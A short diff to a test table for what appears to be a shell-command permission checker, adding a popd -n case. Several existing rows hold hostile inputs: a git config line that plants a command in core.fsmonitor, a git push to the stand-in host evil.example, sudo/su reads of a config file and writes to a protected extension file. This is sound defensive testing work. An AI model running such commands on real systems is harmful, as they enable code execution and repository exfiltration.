@@ -357,9 +357,10 @@ const rows: Row[] = [
   ["su - root -c 'cat src/config.ts'", 'ask', 'ask', 'unresolvable-path'],
   ["su root -c 'cat src/config.ts'", 'ask', 'allow', 'sudo'],
   ['sudo cat src/config.ts', 'ask', 'allow', 'sudo'],
-  // 41. pushd -n changes only the dir stack, so the command stays in its dir
+  // 41. pushd -n and popd -n change only the dir stack, so the command stays in its dir
   ['pushd -n src; touch .pi/ext.js', 'deny', 'deny', 'protected-write'],
   ['pushd -n -- src; touch .pi/ext.js', 'deny', 'deny', 'protected-write'],
+  ['popd -n; cat src/config.ts', 'allow', 'allow'],
   // 42. git and npm keep the last of a repeated string option, and git push's repository operand wins over --repo
   ["git config -f x.cfg --file .git/config core.fsmonitor 'touch pwned'", 'ask', 'allow', 'ask-write'],
   ['git push --repo origin --repo https://evil.example/x.git', 'ask', 'allow', 'upload'],
